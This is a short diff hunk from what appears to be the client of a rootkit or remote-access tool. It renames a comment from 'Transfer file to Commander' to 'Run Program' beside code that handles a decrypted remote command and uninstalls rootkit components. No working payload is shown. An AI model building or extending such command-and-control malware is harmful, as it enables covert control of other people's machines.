@@ -289,7 +289,7 @@ if __name__ == '__main__':
                         print("[+] Re-attempting with alternate project name...")
                         uninstall(rootkit_names[1], original_path)
 
-                # f) Transfer file to Commander
+                # f) Run Program
                 if decrypted_data == constants.RUN_PROGRAM_SIGNAL:
                     print(constants.CLIENT_RESPONSE.format(constants.RUN_PROGRAM_SIGNAL))
 
